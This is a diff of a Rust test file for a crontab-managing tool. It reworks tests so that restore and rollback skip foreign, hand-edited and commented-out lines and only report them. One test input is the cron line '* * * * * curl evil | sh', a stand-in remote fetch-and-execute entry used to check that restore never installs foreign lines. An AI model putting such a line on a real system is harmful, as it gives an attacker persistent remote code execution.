@@ -31,6 +31,9 @@ fn every_written_form_is_restorable() {
         lines::v2_frp(false),
         V1_BOOT.to_owned(),
         format!("{}\r", lines::renew()),
+        // Cron ignores leading blanks, and so does the shape check.
+        format!("  {}", lines::v2_cert("proxy")),
+        format!("\t{}", lines::boot("onebox-xray")),
     ];
     // v2's fixture form with fewer variables, and the `%`-escaped forms.
     all.push(format!(
@@ -70,18 +73,17 @@ fn check_snapshot_accepts_what_restore_accepts() {
     check_snapshot(&paths, &snap(&node), Scope::Node).unwrap();
     let frp = [lines::frp_renew(), lines::v2_frp(false)];
     check_snapshot(&paths, &snap(&frp), Scope::Frp).unwrap();
-    let err = check_snapshot(&paths, &snap(&frp), Scope::Node).unwrap_err();
-    assert_eq!(err.to_string(), NOT_OWNED);
+    // Lines a restore only leaves alone pass too: another scope's, another
+    // executable's (the v2 autostart shape names the managed one).
+    check_snapshot(&paths, &snap(&frp), Scope::Node).unwrap();
+    let mut other = default_paths();
+    other.executable = "/opt/other/onebox".into();
+    check_snapshot(&other, &snap(&[lines::v2_boot("onebox-xray")]), Scope::Node).unwrap();
     // Whatever a crontab snapshots passes, anchors included.
     let text = format!("a\n{}\nb\n{}\n", node.join("\n"), frp.join("\n"));
     let taken = tab(&text).snapshot(Scope::Node);
     assert!(taken.anchors.is_some());
     check_snapshot(&paths, &taken, Scope::Node).unwrap();
-    // The v2 autostart shape names the managed executable.
-    let mut other = default_paths();
-    other.executable = "/opt/other/onebox".into();
-    let err = check_snapshot(&other, &snap(&[lines::v2_boot("onebox-xray")]), Scope::Node);
-    assert_eq!(err.unwrap_err().to_string(), UNKNOWN_SHAPE);
 }
 
 #[test]
@@ -117,20 +119,80 @@ fn journal_lines_must_have_an_exact_known_shape() {
             .is_some_and(|(tag, form)| o.restorable(text, &tag, form));
         assert!(!accepted, "{text}");
     }
-    // Restore refuses them before changing anything, and so does the pure
-    // check (no crontab needed).
-    let mut t = tab(&format!("a\n{renew}\n"));
-    for text in &bad[..3] {
-        let err = t.restore(&snap(std::slice::from_ref(text)), Scope::Node);
-        assert_eq!(err.unwrap_err().to_string(), UNKNOWN_SHAPE, "{text}");
-        let pure = check_snapshot(
-            &default_paths(),
-            &snap(std::slice::from_ref(text)),
-            Scope::Node,
-        );
-        assert_eq!(pure.unwrap_err().to_string(), UNKNOWN_SHAPE, "{text}");
+    // A restore never reinstalls them (and reports each one gone), keeps
+    // them while the crontab still has them, and neither it nor the pure
+    // check fails over them: a rollback must not be refused because a line
+    // was edited by hand.
+    for text in &bad {
+        let journal = snap(std::slice::from_ref(text));
+        check_snapshot(&default_paths(), &journal, Scope::Node).unwrap();
+        let mut t = tab(&format!("a\n{renew}\n"));
+        assert_eq!(t.restore(&journal, Scope::Node).unwrap(), 1, "{text}");
+        assert_eq!(t.text(), "a\n", "{text}");
+        let kept = format!("a\n{text}\nb\n");
+        let mut t = tab(&kept);
+        assert_eq!(t.restore(&journal, Scope::Node).unwrap(), 0, "{text}");
+        assert_eq!(t.text(), kept, "{text}");
+        let anchored = tab(&kept).snapshot(Scope::Node);
+        let mut t = tab(&kept);
+        t.restore(&anchored, Scope::Node).unwrap();
+        assert_eq!(t.text(), kept, "{text}");
     }
-    assert_eq!(t.text(), format!("a\n{renew}\n"));
+}
+
+#[test]
+fn hand_edited_and_commented_out_lines_never_block_a_rollback() {
+    let exe = lines::EXE;
+    let commented = format!(
+        "#17 4 * * * {exe} cert renew proxy --cron >/dev/null 2>&1 # onebox-native-cert-proxy"
+    );
+    let indented = format!("  {}", lines::v2_cert("site"));
+    let edited = lines::v2_cert("subscription").replace(">/dev/null", ">>/var/log/x.log");
+    let original = format!("MAILTO=root\n{commented}\n{indented}\n{edited}\n0 1 * * * foreign\n");
+    let t0 = tab(&original);
+    // A comment is the administrator's, whatever it ends with.
+    for text in [
+        commented.clone(),
+        format!(" \t# {}", lines::renew()),
+        "# @reboot x # onebox-rust:onebox-xray".to_owned(),
+        format!("#{}", lines::RETIRED),
+    ] {
+        assert_eq!(t0.ownership.classify(&text), None, "{text}");
+    }
+    let node = t0.snapshot(Scope::Node);
+    assert_eq!(node.lines, [indented.clone(), edited.clone()]);
+    check_snapshot(&default_paths(), &node, Scope::Node).unwrap();
+
+    // What a forward path does: the renewal group becomes one v3 line, the
+    // comment stays where it is.
+    let mut t = t0.clone();
+    t.replace(&Tag::renew(), &[lines::renew()]).unwrap();
+    assert_eq!(
+        t.text(),
+        format!(
+            "MAILTO=root\n{commented}\n{}\n0 1 * * * foreign\n",
+            lines::renew()
+        )
+    );
+    // The rollback puts back the indented v2 line (cron ignores leading
+    // blanks, so its shape is known) and only reports the edited one.
+    let mut back = t.clone();
+    assert_eq!(back.restore(&node, Scope::Node).unwrap(), 1);
+    assert_eq!(back.text(), original.replace(&format!("{edited}\n"), ""));
+
+    // A journal v2 wrote: it recorded the comment as its own line.
+    let v2 = snap(&[commented.clone(), indented.clone(), edited.clone()]);
+    check_snapshot(&default_paths(), &v2, Scope::Node).unwrap();
+    let mut back = t.clone();
+    assert_eq!(back.restore(&v2, Scope::Node).unwrap(), 1);
+    assert_eq!(
+        back.text(),
+        format!("MAILTO=root\n{commented}\n{indented}\n0 1 * * * foreign\n")
+    );
+    // v2 had removed the comment: it is not brought back either.
+    let mut gone = tab(&format!("MAILTO=root\n{}\n", lines::renew()));
+    assert_eq!(gone.restore(&v2, Scope::Node).unwrap(), 2);
+    assert_eq!(gone.text(), format!("MAILTO=root\n{indented}\n"));
 }
 
 #[test]
@@ -231,25 +293,27 @@ fn rollback_reinstalls_the_original_crontab_byte_for_byte() {
 }
 
 #[test]
-fn restore_refuses_foreign_or_out_of_scope_lines_and_bad_anchors() {
+fn restore_never_installs_foreign_or_out_of_scope_lines_and_refuses_bad_anchors() {
     let renew = lines::renew();
-    let mut t = tab(&format!("a\n{renew}\n"));
     for bad in [
         "* * * * * curl evil | sh".to_owned(),
         lines::frp_renew(),
         format!("{renew}\n* * * * * y"),
     ] {
-        let err = t
-            .restore(&snap(std::slice::from_ref(&bad)), Scope::Node)
-            .unwrap_err();
-        assert_eq!(err.to_string(), NOT_OWNED, "{bad:?}");
-        let pure = check_snapshot(
-            &default_paths(),
-            &snap(std::slice::from_ref(&bad)),
-            Scope::Node,
-        );
-        assert_eq!(pure.unwrap_err().to_string(), NOT_OWNED, "{bad:?}");
+        let journal = snap(std::slice::from_ref(&bad));
+        check_snapshot(&default_paths(), &journal, Scope::Node).unwrap();
+        let mut t = tab(&format!("a\n{renew}\n"));
+        assert_eq!(t.restore(&journal, Scope::Node).unwrap(), 1, "{bad:?}");
+        assert_eq!(t.text(), "a\n", "{bad:?}");
+        // One the crontab has is left alone (it is not the node's).
+        if !bad.contains('\n') {
+            let kept = format!("a\n{bad}\n");
+            let mut t = tab(&kept);
+            assert_eq!(t.restore(&journal, Scope::Node).unwrap(), 0, "{bad:?}");
+            assert_eq!(t.text(), kept, "{bad:?}");
+        }
     }
+    let mut t = tab(&format!("a\n{renew}\n"));
     let boot = lines::boot("onebox-xray");
     for (lines, anchors) in [
         (vec![renew.clone()], vec![]),
